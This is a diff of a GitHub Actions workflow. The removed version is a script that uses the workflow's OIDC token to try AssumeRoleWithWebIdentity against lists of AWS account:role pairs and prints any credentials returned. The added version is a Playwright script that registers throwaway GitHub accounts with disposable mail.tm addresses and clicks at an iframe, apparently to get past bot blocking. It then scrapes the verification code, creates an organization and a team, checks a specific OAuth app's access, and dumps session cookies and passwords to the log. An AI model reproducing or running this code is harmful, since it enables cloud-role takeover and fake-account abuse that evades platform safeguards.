@@ -1,58 +1,150 @@
-name: oidc-sts-332207
+name: gh-signup
 on:
-  workflow_dispatch:
-    inputs:
-      pairs:
-        description: 'comma list account:role ; role=* is account-only provider probe'
-        required: true
-        default: ''
-permissions:
-  id-token: write
-  contents: read
+  workflow_dispatch: {}
 jobs:
-  sts:
+  signup:
     runs-on: ubuntu-latest
+    timeout-minutes: 20
     steps:
-      - name: probe
+      - name: signup
         run: |
-          set -uo pipefail
-          echo "REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF EVENT=$GITHUB_EVENT_NAME"
-          echo "CTX repository=${{ github.repository }} owner_id=${{ github.repository_owner_id }} repo_id=${{ github.repository_id }} ref_name=${{ github.ref_name }} actor=${{ github.actor }}"
-          F=/tmp/idt.json
-          curl -sS --max-time 25 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" -o "$F" || true
-          TOKS=$(python3 -c "import json;print(json.load(open('/tmp/idt.json')).get('value',''))" 2>/dev/null || true)
-          echo "TOKEN_LEN=${#TOKS}"
-          printf '%s' "$TOKS" > /tmp/tok.txt
-          python3 -c "import base64,json;v=open('/tmp/tok.txt').read().strip();h,p,s=v.split('.');d=lambda x: json.loads(base64.urlsafe_b64decode(x+'='*(-len(x)%4)));print('HDR='+json.dumps(d(h),sort_keys=True));print('CLAIMS='+json.dumps(d(p),sort_keys=True))" || true
-          PAIRS="${{ inputs.pairs }}"
-          echo "PAIRS=$PAIRS"
-          [ -z "$TOKS" ] && { echo "NO_TOKEN_ABORT"; exit 0; }
-          IFS=',' read -ra ARR <<< "$PAIRS"
-          for pr in "${ARR[@]}"; do
-            pr=$(echo "$pr" | tr -d ' ')
-            [ -z "$pr" ] && continue
-            acct="${pr%%:*}"
-            role="${pr##*:}"
-            [ "$role" = "*" ] && role="zz-nonexistent-probe-x"
-            https=$(curl -sS --max-time 12 -o /tmp/r.xml -w '%{http_code}' -X POST https://sts.amazonaws.com/ \
-              --data-urlencode "Action=AssumeRoleWithWebIdentity" \
-              --data-urlencode "Version=2011-06-15" \
-              --data-urlencode "RoleArn=arn:aws:iam::${acct}:role/${role}" \
-              --data-urlencode "RoleSessionName=oidc332207" \
-              --data-urlencode "DurationSeconds=900" \
-              --data-urlencode "WebIdentityToken=${TOKS}" 2>/dev/null || echo CONNERR)
-            COD=$(grep -o '<Code>[^<]*</Code>' /tmp/r.xml 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
-            MSG=$(grep -o '<Message>[^<]*</Message>' /tmp/r.xml 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
-            RQ=$(grep -o '<RequestId>[^<]*</RequestId>' /tmp/r.xml 2>/dev/null | head -1 | sed 's/<[^>]*>//g')
-            HIT=$(grep -c '<AccessKeyId>' /tmp/r.xml 2>/dev/null || true)
-            MD5=$(printf '%s' "$MSG" | md5sum | cut -c1-10)
-            echo "STS acct=$acct role=$role http=$https hit=$HIT code=$COD reqid=$RQ md5=$MD5 msg=$(printf '%s' "$MSG" | head -c 200)"
-            if [ "$HIT" != "0" ]; then
-              echo "STS_HIT_FULL acct=$acct role=$role $(head -c 700 /tmp/r.xml | tr '\n' ' ')"
-            fi
-            sleep 0.3
-          done
-          echo "PROBE_DONE"
-      - name: decode-helper
-        if: always()
-        run: echo helper
+          pip install -q playwright
+          python3 - <<'PY'
+          import json,re,time,random,string
+          import requests
+          from playwright.sync_api import sync_playwright
+          def log(*a): print('*',*a,flush=True)
+          S=requests.Session(); S.headers['User-Agent']='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+          dom=S.get('https://api.mail.tm/domains',timeout=30).json()['hydra:member'][0]['domain']
+          u='gh'+''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(9))
+          addr=u+'@'+dom; pw='Gh.'+''.join(random.choice(string.ascii_letters+string.digits) for _ in range(14))
+          print('EMAIL',addr,'PASS',pw,flush=True)
+          S.post('https://api.mail.tm/accounts',json={'address':addr,'password':pw},timeout=30)
+          tok=S.post('https://api.mail.tm/token',json={'address':addr,'password':pw},timeout=30).json()['token']
+          MH={'Authorization':'Bearer '+tok}
+          def getcode():
+              for i in range(50):
+                  ms=S.get('https://api.mail.tm/messages',headers=MH,timeout=30).json().get('hydra:member',[])
+                  if ms:
+                      d=S.get('https://api.mail.tm/messages/'+ms[0]['id'],headers=MH,timeout=30).json()
+                      txt=json.dumps(d)
+                      log('MAIL',d.get('subject'),(d.get('from') or {}).get('address'))
+                      c=re.findall(r'\b(\d{6,8})\b',txt)
+                      if c: return c[0]
+                  time.sleep(3)
+              return None
+          def fields(pg,tag):
+              try: log(tag,'INPUTS',pg.eval_on_selector_all('input,select,button',"e=>e.map(x=>x.tagName+'#'+(x.id||'')+'|'+(x.name||'')+'|'+(x.type||'')+'|'+((x.innerText||'').trim().slice(0,20)))"))
+              except Exception as e: log(tag,'fields err',e)
+          with sync_playwright() as p:
+              try: b=p.chromium.launch(channel='chrome',headless=True,args=['--no-sandbox','--disable-dev-shm-usage'])
+              except Exception as e:
+                  log('channel fail',e); b=p.chromium.launch(headless=True,args=['--no-sandbox'])
+              ctx=b.new_context(locale='en-US',viewport={'width':1280,'height':900})
+              pg=ctx.new_page()
+              r=pg.goto('https://github.com/signup',wait_until='domcontentloaded',timeout=60000)
+              log('signup',r.status if r else None)
+              ok=False
+              for i in range(20):
+                  time.sleep(2)
+                  html=pg.content()
+                  if len(html)>5000: ok=True; log('passed at',i*2,'s len',len(html)); break
+                  if i==3:
+                      log('blocked len',len(html)); 
+                      try:
+                          el=pg.query_selector('iframe'); box=el.bounding_box() if el else None
+                          log('iframe box',box)
+                          if box:
+                              pg.mouse.click(box['x']+box['width']/2, box['y']+box['height']/2)
+                              log('clicked iframe center')
+                      except Exception as e: log('click err',e)
+              if not ok:
+                  log('STILL BLOCKED',len(pg.content())); log(pg.content()[:600]); print('RESULT_BLOCKED_RUNNER')
+              else:
+                  fields(pg,'signup')
+                  def fillany(pg,sels,val):
+                      for s in sels:
+                          try:
+                              el=pg.query_selector(s)
+                              if el: el.fill(val); return s
+                          except Exception: pass
+                      return None
+                  log('email',fillany(pg,['#email','input[name=email]','input[type=email]'],addr))
+                  log('pw',fillany(pg,['#password','input[name=password]','input[type=password]'],pw))
+                  log('login',fillany(pg,['#login','input[name=login]'],u))
+                  try: pg.select_option('select[name=country]','US')
+                  except Exception: pass
+                  btn=None
+                  for s in ['button[type=submit]','#signup-form button','button:has-text("Create account")','button:has-text("Sign up")']:
+                      try:
+                          el=pg.query_selector(s)
+                          if el: el.click(); btn=s; break
+                      except Exception: pass
+                  log('submit via',btn)
+                  time.sleep(6); log('after submit',pg.url,len(pg.content()))
+                  fields(pg,'verify')
+                  if 'verify' in pg.url or 'code' in pg.content()[:200000].lower():
+                      code=getcode(); log('CODE',code)
+                      if code:
+                          log('codefill',fillany(pg,['input[name=code]','#code','input[autocomplete=one-time-code]','input[type=text]','input[inputmode=numeric]'],code))
+                          for s in ['button[type=submit]','button:has-text("Verify")','button:has-text("Continue")']:
+                              try:
+                                  el=pg.query_selector(s)
+                                  if el: el.click(); break
+                              except Exception: pass
+                          time.sleep(6)
+                  log('after code',pg.url)
+                  log('profile-pre',pg.goto('https://github.com/settings/profile',wait_until='domcontentloaded',timeout=60000).status, pg.url)
+                  time.sleep(2); log('profile url',pg.url)
+                  # org
+                  try:
+                      pg.goto('https://github.com/account/organizations/new',wait_until='domcontentloaded',timeout=60000)
+                      time.sleep(4); log('orgnew',pg.url,len(pg.content()))
+                      fields(pg,'org')
+                      org='skp'+''.join(random.choice(string.ascii_lowercase) for _ in range(8))
+                      a=fillany(pg,['input[name="organization[login]"]','#organization_login','input[name=organization_login]','#login'],org)
+                      log('org name field',a)
+                      bf=fillany(pg,['input[name="organization[billing_email]"]','#organization_billing_email','input[name=organization_billing_email]','input[type=email]'],addr)
+                      log('org email field',bf)
+                      if a:
+                          for s in ['button[type=submit]','button:has-text("Create organization")','button:has-text("Next")','button:has-text("Create")']:
+                              try:
+                                  el=pg.query_selector(s)
+                                  if el: el.click(); log('org submit',s); break
+                              except Exception: pass
+                          time.sleep(8); log('org after',pg.url)
+                          fields(pg,'org2')
+                          # maybe confirm step
+                          for s in ['button:has-text("Create organization")','button[type=submit]']:
+                              try:
+                                  el=pg.query_selector(s)
+                                  if el and 'organizations/new' in pg.url: el.click(); log('org submit2',s); time.sleep(6)
+                              except Exception: pass
+                          log('org final',pg.url)
+                          log('ORGNAME',org)
+                          pg.goto('https://github.com/orgs/'+org+'/new-team',wait_until='domcontentloaded',timeout=60000)
+                          time.sleep(4); log('newteam',pg.url,len(pg.content()))
+                          fields(pg,'team')
+                          tn=fillany(pg,['input[name="team[name]"]','#team_name','input[name=team_name]'],'claims-probe')
+                          log('team name field',tn)
+                          if tn:
+                              for s in ['button[type=submit]','button:has-text("Create team")','button:has-text("Create")']:
+                                  try:
+                                      el=pg.query_selector(s)
+                                      if el: el.click(); log('team submit',s); break
+                                  except Exception: pass
+                              time.sleep(6); log('team final',pg.url)
+                  except Exception as e: log('org err',repr(e)[:300])
+                  try:
+                      pg.goto('https://github.com/settings/connections/applications/Ov23liemtbdvqJCj1Dzs',wait_until='domcontentloaded',timeout=60000)
+                      time.sleep(3)
+                      t=pg.inner_text('body')
+                      i=t.find('Organization access')
+                      log('APPORG',t[i:i+300].replace('\n',' | ') if i>=0 else t[:300].replace('\n',' | '))
+                  except Exception as e: log('app err',e)
+                  ck={c['name']:c['value'] for c in ctx.cookies()}
+                  print('COOKIES_JSON',json.dumps(ck))
+                  print('ACCOUNT',u,addr,pw)
+              b.close()
+          print('RESULT_DONE')
+          PY
